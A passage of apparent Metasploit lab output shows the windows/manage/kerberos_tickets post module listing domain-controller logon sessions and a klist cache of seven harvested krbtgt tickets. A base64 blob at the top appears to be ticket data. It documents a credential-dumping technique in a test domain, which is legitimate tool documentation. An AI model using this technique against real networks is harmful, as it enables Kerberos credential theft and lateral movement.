3FdH95HdQVG7PNg93e3+2XvnrkWEc2md+UhYacKvMMBrXzGAz1d+ea/V3Yt2EgZc1WWAWoKVCfw6RUeTQVs2pWjq7j2APjhzjAEa4s543xgmT0jIHZnfkGzTwjM5f5mhj1KeFkff98pEQX+QjjBFnaRDnIkBmzRmAyJNzxjwAhiW/RNxYNYG3UOnpmxxV443vN3wr3e+MFvBG9azFlq36iWs+2jGNUuFTdH6RECf7/tNun+DE622vI1hIaBJLAHMHzdSIt9kLTQ+OzECGjH0QNRHHibwLhyR36UHShr/ei4/PO87kKw+ZVpb0rHNcICaT80MhCIGWLlH5SErAKQe/vOkDgqeLW+keCbZfW8F7QBXc6C9kUpzUQuIII7KvLKskbgwhqPhoVV70x9vFXWG1xSFwzPJdQmDRBanyQ0xoQFhmt2MO6lMRXTpheAAL+uBJOpgYWX5GBA=
[*] LogonSession LUID: 0x00004d345 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:33:18 -0400
[*] LogonSession LUID: 0x00004bfb9 
[*]   User:                  MSFLAB\DC$
[*]   Session:               0
[*]   AuthenticationPackage: Kerberos
[*]   LogonType:             Network (3)
[*]   LogonTime:             2023-08-23 08:33:17 -0400
[*] Post module execution completed
msf6 post(windows/manage/kerberos_tickets) > klist
Kerberos Cache
==============
id   host            principal               sname                             issued                     status  path
--   ----            ---------               -----                             ------                     ------  ----
398  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:17 -0400  active  /home/smcintyre/.msf4/loot/20230823135453_default_192.168.159.10_mit.kerberos.cca_948767.bin
399  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:17 -0400  active  /home/smcintyre/.msf4/loot/20230823135459_default_192.168.159.10_mit.kerberos.cca_126280.bin
400  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:17 -0400  active  /home/smcintyre/.msf4/loot/20230823135505_default_192.168.159.10_mit.kerberos.cca_341258.bin
401  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:17 -0400  active  /home/smcintyre/.msf4/loot/20230823135505_default_192.168.159.10_mit.kerberos.cca_389858.bin
404  192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:18 -0400  active  /home/smcintyre/.msf4/loot/20230823135509_default_192.168.159.10_mit.kerberos.cca_783228.bin
402  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823135507_default_192.168.159.10_mit.kerberos.cca_909298.bin
403  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823135508_default_192.168.159.10_mit.kerberos.cca_938606.bin

msf6 post(windows/manage/kerberos_tickets) >
```
